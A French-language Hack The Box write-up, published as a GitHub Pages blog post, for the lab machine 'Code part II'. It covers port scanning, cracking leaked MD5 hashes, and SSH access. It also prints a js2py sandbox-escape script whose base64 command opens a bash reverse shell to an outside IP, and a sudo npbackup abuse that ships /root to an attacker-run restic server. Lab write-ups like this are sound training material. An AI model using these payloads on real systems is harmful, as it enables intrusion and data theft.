@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Code part II Writeup | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Code part II Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is a writeup for the HTB box “code part II”" />
+<meta property="og:description" content="This is a writeup for the HTB box “code part II”" />
+<link rel="canonical" href="/HTB/codePartTwo.html" />
+<meta property="og:url" content="/HTB/codePartTwo.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-17T10:37:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Code part II Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-17T10:37:00+02:00","datePublished":"2025-09-17T10:37:00+02:00","description":"This is a writeup for the HTB box “code part II”","headline":"Code part II Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/codePartTwo.html"},"url":"/HTB/codePartTwo.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Code part II Writeup</h1>
+      <h2 class="project-tagline">This is a writeup for the HTB box "code part II"</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="enumeration">Enumeration</h1>
+
+<p>On fait une petite énumération mais on ne trouve que ça au départ:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Gunicorn 20.0.4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>On regarde un peu sur le port 8000, on tombe sur un site web qui nous propose d’écrire du code, sous ECMA 5.1, de l’exécuter et de le sauvegarder. J’ai donc créé un compte et essayé de chercher un exploit.</p>
+
+<p>En parallèle, l’énumération gobuster ne donne rien du tout, on ne trouve que les pages de base, celles que l’on peut trouver en cherchant manuellement sur le site.</p>
+
+<p>En plus de ça, on trouve un fichier zip sur le site, nous donnant le code du site, ce qui ne nous aide pas à grand chose pour le moment excepté pour savoir où trouver les fichiers intéressants.</p>
+
+<p>Comme on a de quoi exécuter du code, j’ai cherché pendant un looooong moment comment exécuter un RCE en javascript. J’ai donc trouvé un payload sur <a href="revshells.com" class="web-link">revshells.com</a>, qui était en fait un payload en PHP ou Java (je ne sais plus), un programme qui devait en générer un mais qui en fait attendait des connexions distantes comme un listener, et aucune doc. Après un peu de recherches et de temps perdu je me suis rappelé que le JS était exécuté côté client. Il doit y avoir quelques instances de code où le JS est exécuté côté machine (Node.js par exemple), cela vaudrait la peine de rechercher plus tard #TODO .</p>
+
+<p>On est donc de retour aux scans, comme on ne trouve rien. On repart avec un scan des ports UDP, mais cela ne donne rien. Comme le site est sur le port 8000 et pas 80, cela vaut la peine de chercher un peu plus. On lance donc une commande de plus pour fouiller extensivement les ports TCP</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nv">$box</span> <span class="nt">-o</span> nmap.scan
+</code></pre></div></div>
+<p>et on obtient une réponse intéressante:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Gunicorn 20.0.4
+9009/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Ce n’est pas le port 80 mais on avance.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/codePartTwo%20images/Pasted%20image%2020251105230145.png"></span></p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>On se connecte sur le port 9009 et on trouve un unique fichier <code class="language-plaintext highlighter-rouge">users.db</code>. On le télécharge et l’ouvre avec <code class="language-plaintext highlighter-rouge">sqlite3</code> et BINGO, on a des identifiants:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1|marco|649c9d65a206a75f5abe509fe128bce5
+2|app|a97588c0e2fa3a024876339e27aeb42e
+</code></pre></div></div>
+
+<p><a href="crackstation.net" class="web-link">Crackstation</a> identifie le premier comme un hash md5, correspondant au mot de passe <code class="language-plaintext highlighter-rouge">sweetangelbabylove</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>marco:sweetangelbabylove
+</code></pre></div></div>
+
+<p>On essaye de le cracker avec hashcat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 hash.txt /usr/share/wordlists/rockyou.txt  
+</code></pre></div></div>
+
+<p>Malheureusement cela ne donne rien. On y reviendra si jamais on en a vraiment besoin.</p>
+
+<p>On tente de se connecter en ssh (qu’on avait vu dans les scans, même si il y a toujours ssh) avec les identifiants de marco et BINGO, on a un accès à la machine. Et juste comme ça, on a notre flag user.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/codePartTwo%20images/Pasted%20image%2020251105230225.png"></span></p>
+
+<h1 id="alternative-foothold">Alternative foothold</h1>
+
+<p>Il existe aussi sur cette box une rce, que l’on peut utiliser avec le code suivant.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests  
+import json  
+  
+url = 'http://codetwo.htb:8000/run_code'  
+  
+js_code = """  
+let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuNTYvNDQ0NCAwPiYxKSAm|base64 -d|bash";  
+let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
+let obj = a(a(a,"__class__"), "__base__");  
+function findpopen(o) {  
+    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" &amp;&amp; item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" &amp;&amp; (result = findpopen(item))) {            return result;        }    }}  
+let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
+console.log(result);  
+result;  
+"""  
+  
+payload = {"code": js_code}  
+  
+headers = {"Content-Type": "application/json"}  
+  
+r = requests.post(url, data=json.dumps(payload), headers=headers)  
+print(r.text)
+</code></pre></div></div>
+
+<h1 id="lol--lateral-movement">LOL / Lateral movement</h1>
+
+<p>Aucun mouvement latéral à faire, on se concentre directement sur la privilege escalation, merci marco.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>#npbackup</p>
+
+<p>On commence une petite énumération avec</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+
+<p>On trouve un fichier <code class="language-plaintext highlighter-rouge">npbackup.conf</code></p>
+
+<p>On n’a pas accès au dossier backups en revanche, il appartient à root.</p>
+
+<p>On continue avec</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>Et on trouve</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+</code></pre></div></div>
+
+<p>On cat le contenu de ce fichier pour comprendre ce qu’il fait:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+import re
+import sys
+from npbackup.__main__ import main
+if __name__ == '__main__':
+    # Block restricted flag
+    if '--external-backend-binary' in sys.argv:
+        print("Error: '--external-backend-binary' flag is restricted for use.")
+        sys.exit(1)
+
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+</code></pre></div></div>
+
+<p>On teste un peu la commande avec sudo et on voit comment la sauvegarde est faite. La commande à utiliser est</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/local/bin/npbackup-cli <span class="nt">-c</span> npbackup.conf <span class="nt">-b</span>
+</code></pre></div></div>
+
+<p>Donc on copie la configuration du fichier <code class="language-plaintext highlighter-rouge">npbackup.conf</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp npbackup.conf testbackup.conf
+</code></pre></div></div>
+
+<p>Puis on modifie la config de sorte à ce qu’elle copie <code class="language-plaintext highlighter-rouge">/root</code> et non pas <code class="language-plaintext highlighter-rouge">/home/app/app</code>. Ensuite, étant donné qu’on a l’uri et le mot de passe, on va essayer d’accéder au repo. On lit sur la <a href="https://pypi.org/project/npbackup/3.0.0rc9/" class="web-link">doc</a> que les repos npbackup peuvent être gérés par restic.</p>
+
+<p>On lit dans la doc de npbackup que les informations importantes comme le uri de repo et le mote de passe sont encryptés, il nous faut donc les décrypter avant d’y accéder.</p>
+
+<p>On lance notre serveur restic</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./rest-server --path /tmp/restictemp --listen :8888 --no-auth
+</code></pre></div></div>
+
+<p>Ensuite on copie le fichier <code class="language-plaintext highlighter-rouge">npbackup.conf</code> dans <code class="language-plaintext highlighter-rouge">test.conf</code> et on met notre repo <code class="language-plaintext highlighter-rouge">rest:http://&lt;yourip&gt;:8888/cpt</code> et notre mot de passe <code class="language-plaintext highlighter-rouge">pass</code> dans la config, on lance la backup</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/local/bin/npbackup-cli -c test.conf -b
+</code></pre></div></div>
+
+<p>On a donc notre repo restic qui tourne sur l’adresse</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rest:http://10.10.14.239:8888/cpt
+</code></pre></div></div>
+
+<p>On va donc exécuter une backup sur le dossier /root. Pour cela, on se fait une config <code class="language-plaintext highlighter-rouge">test.conf</code> dans laquelle on met une version modifiée de <code class="language-plaintext highlighter-rouge">npbackup.conf</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      rest:http://10.10.14.239:8888/cpt
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        pass
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: false
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+        pass
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+</code></pre></div></div>
+
+<p>Ensuite, on fait la backup</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/local/bin/npbackup-cli -c test.conf -bf
+</code></pre></div></div>
+
+<p>Puis on vérifie que la backup a bien été faite avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>restic -r rest:http://10.10.14.239:8888/cpt snapshots
+</code></pre></div></div>
+
+<p>Une fois que l’on a bien vu que la backup était faite, on retourne sur la machine attacker, sur laquelle on entre la commande</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>restic -r rest:http://10.10.14.239:8888/cpt snapshots
+</code></pre></div></div>
+<p>pour obtenir le numéro de la backup. On le copie puis on restitue la backup dans notre machine attacker avec</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>restic -r /tmp/restictemp/cpt restore &lt;snapshot_id&gt; --target ./restore
+</code></pre></div></div>
+
+<p>et on peut enfin lire le fichier root.txt</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/codePartTwo%20images/Pasted%20image%2020251112181156.png"></span></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
